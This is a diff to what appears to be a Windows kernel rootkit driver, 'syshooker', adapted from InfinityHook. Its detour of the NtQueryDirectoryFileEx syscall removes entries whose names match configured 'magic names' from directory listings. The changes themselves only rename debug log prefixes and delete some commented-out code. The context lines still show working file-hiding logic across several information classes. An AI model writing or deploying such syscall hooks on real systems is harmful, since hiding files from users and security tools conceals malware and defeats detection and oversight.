@@ -30,12 +30,9 @@ NTSTATUS DetourNtQueryDirectoryFileEx(
 	_In_ ULONG QueryFlags,
 	_In_opt_ PUNICODE_STRING FileName)
 {
-	//kprintf("[+] infinityhook: NtQueryDirectoryFileEx: filename: %wZ, class: %d\n", FileName, FileInformationClass);
+	//kprintf("[+] syshooker: NtQueryDirectoryFileEx: filename: %wZ, class: %d\n", FileName, FileInformationClass);
 
-
-	//
 	// Call the original syscall so that the buffers are populated
-	//
 	NTSTATUS OriginalStatus = OriginalNtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, QueryFlags, FileName);
 
 	if (NT_SUCCESS(OriginalStatus)) {
@@ -61,7 +58,7 @@ NTSTATUS DetourNtQueryDirectoryFileEx(
 					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
 				}
 				if (matchMagicNames(FileNameBuffer, (Target)TARGET_FILE)) {
-					kprintf("[+] infinityhook: NtQueryDirectoryFileEx: should hide: %ws\n", FileNameBuffer);
+					kprintf("[+] syshooker: NtQueryDirectoryFileEx: should hide: %ws\n", FileNameBuffer);
 					// Not the last one
 					if (FileInformationPtr->NextEntryOffset > 0) {
 						// calculate how many bytes from the next record (current should be deleted) to the end of the buffer
@@ -106,7 +103,7 @@ NTSTATUS DetourNtQueryDirectoryFileEx(
 		else if (FileInformationClass == 2) {
 			PFILE_FULL_DIR_INFORMATION FileInformationPtr = (PFILE_FULL_DIR_INFORMATION)FileInformation;
 			PFILE_FULL_DIR_INFORMATION PreviousFileInformationPtr = (PFILE_FULL_DIR_INFORMATION)FileInformation; // necessary for hiding the last file
-			//kprintf("[+] infinityhook: NtQueryDirectoryFileEx: FileInformation struct, FileNameLength: %d, FileName char: %x\n", FileInformationPtr->FileNameLength, (FileInformationPtr->FileName)[0]);
+			//kprintf("[+] syshooker: NtQueryDirectoryFileEx: FileInformation struct, FileNameLength: %d, FileName char: %x\n", FileInformationPtr->FileNameLength, (FileInformationPtr->FileName)[0]);
 
 			while (1) {
 				WCHAR FileNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
@@ -114,11 +111,7 @@ NTSTATUS DetourNtQueryDirectoryFileEx(
 					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
 				}
 				if (matchMagicNames(FileNameBuffer, (Target)TARGET_FILE)) {
-					kprintf("[+] infinityhook: NtQueryDirectoryFileEx: SHOULD HIDE: %ws\n", FileNameBuffer);
-					// change its name to be xxx
-					/*for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) {
-						(FileInformationPtr->FileName)[i] = L'x';
-					}*/
+					kprintf("[+] syshooker: NtQueryDirectoryFileEx: SHOULD HIDE: %ws\n", FileNameBuffer);
 
 					// Not the last one
 					if (FileInformationPtr->NextEntryOffset > 0) {
@@ -144,7 +137,7 @@ NTSTATUS DetourNtQueryDirectoryFileEx(
 
 					// Last one
 					else {
-						kprintf("[+] infinityhook: NtQueryDirectoryFileEx: SHOULD HIDE - LAST ONE\n");
+						kprintf("[+] syshooker: NtQueryDirectoryFileEx: SHOULD HIDE - LAST ONE\n");
 
 						// set previous NextEntryOffset to 0
 						PreviousFileInformationPtr->NextEntryOffset = 0;
@@ -173,7 +166,7 @@ NTSTATUS DetourNtQueryDirectoryFileEx(
 					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
 				}
 				if (matchMagicNames(FileNameBuffer, (Target)TARGET_FILE)) {
-					kprintf("[+] infinityhook: NtQueryDirectoryFileEx: should hide: %ws\n", FileNameBuffer);
+					kprintf("[+] syshooker: NtQueryDirectoryFileEx: should hide: %ws\n", FileNameBuffer);
 					// Not the last one
 					if (FileInformationPtr->NextEntryOffset > 0) {
 						// calculate how many bytes from the next record (current should be deleted) to the end of the buffer
@@ -225,7 +218,7 @@ NTSTATUS DetourNtQueryDirectoryFileEx(
 					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
 				}
 				if (matchMagicNames(FileNameBuffer, (Target)TARGET_FILE)) {
-					kprintf("[+] infinityhook: NtQueryDirectoryFileEx: should hide: %ws\n", FileNameBuffer);
+					kprintf("[+] syshooker: NtQueryDirectoryFileEx: should hide: %ws\n", FileNameBuffer);
 					// Not the last one
 					if (FileInformationPtr->NextEntryOffset > 0) {
 						// calculate how many bytes from the next record (current should be deleted) to the end of the buffer
@@ -277,7 +270,7 @@ NTSTATUS DetourNtQueryDirectoryFileEx(
 					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
 				}
 				if (matchMagicNames(FileNameBuffer, (Target)TARGET_FILE)) {
-					kprintf("[+] infinityhook: NtQueryDirectoryFileEx: should hide: %ws\n", FileInformationPtr->FileNameLength, FileNameBuffer);
+					kprintf("[+] syshooker: NtQueryDirectoryFileEx: should hide: %ws\n", FileInformationPtr->FileNameLength, FileNameBuffer);
 					// Not the last one
 					if (FileInformationPtr->NextEntryOffset > 0) {
 						// calculate how many bytes from the next record (current should be deleted) to the end of the buffer
@@ -329,7 +322,7 @@ NTSTATUS DetourNtQueryDirectoryFileEx(
 					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
 				}
 				if (matchMagicNames(FileNameBuffer, (Target)TARGET_FILE)) {
-					kprintf("[+] infinityhook: NtQueryDirectoryFileEx: should hide: %ws\n", FileNameBuffer);
+					kprintf("[+] syshooker: NtQueryDirectoryFileEx: should hide: %ws\n", FileNameBuffer);
 					// Not the last one
 					if (FileInformationPtr->NextEntryOffset > 0) {
 						// calculate how many bytes from the next record (current should be deleted) to the end of the buffer
@@ -381,7 +374,7 @@ NTSTATUS DetourNtQueryDirectoryFileEx(
 					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
 				}
 				if (matchMagicNames(FileNameBuffer, (Target)TARGET_FILE)) {
-					kprintf("[+] infinityhook: NtQueryDirectoryFileEx: should hide: %ws\n", FileNameBuffer);
+					kprintf("[+] syshooker: NtQueryDirectoryFileEx: should hide: %ws\n", FileNameBuffer);
 					// Not the last one
 					if (FileInformationPtr->NextEntryOffset > 0) {
 						// calculate how many bytes from the next record (current should be deleted) to the end of the buffer
@@ -433,7 +426,7 @@ NTSTATUS DetourNtQueryDirectoryFileEx(
 					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
 				}
 				if (matchMagicNames(FileNameBuffer, (Target)TARGET_FILE)) {
-					kprintf("[+] infinityhook: NtQueryDirectoryFileEx: should hide: %ws\n", FileNameBuffer);
+					kprintf("[+] syshooker: NtQueryDirectoryFileEx: should hide: %ws\n", FileNameBuffer);
 					// Not the last one
 					if (FileInformationPtr->NextEntryOffset > 0) {
 						// calculate how many bytes from the next record (current should be deleted) to the end of the buffer
@@ -485,7 +478,7 @@ NTSTATUS DetourNtQueryDirectoryFileEx(
 					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
 				}
 				if (matchMagicNames(FileNameBuffer, (Target)TARGET_FILE)) {
-					kprintf("[+] infinityhook: NtQueryDirectoryFileEx: should hide: %ws\n", FileNameBuffer);
+					kprintf("[+] syshooker: NtQueryDirectoryFileEx: should hide: %ws\n", FileNameBuffer);
 					// Not the last one
 					if (FileInformationPtr->NextEntryOffset > 0) {
 						// calculate how many bytes from the next record (current should be deleted) to the end of the buffer
